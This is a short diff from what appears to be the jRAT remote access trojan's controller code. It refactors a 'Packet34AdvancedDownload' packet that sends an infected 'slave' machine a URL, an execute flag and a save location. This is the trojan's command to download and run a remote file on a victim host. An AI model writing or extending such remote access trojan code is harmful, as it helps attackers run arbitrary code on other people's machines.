@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet34AdvancedDownload extends AbstractOutgoingPacket {
 
@@ -18,10 +16,10 @@ public class Packet34AdvancedDownload extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
+	public void write(Slave slave) throws Exception {
 		slave.writeLine(url);
-		dos.writeBoolean(execute);
-		dos.writeInt(location);
+		slave.writeBoolean(execute);
+		slave.writeInt(location);
 	}
 
 	@Override
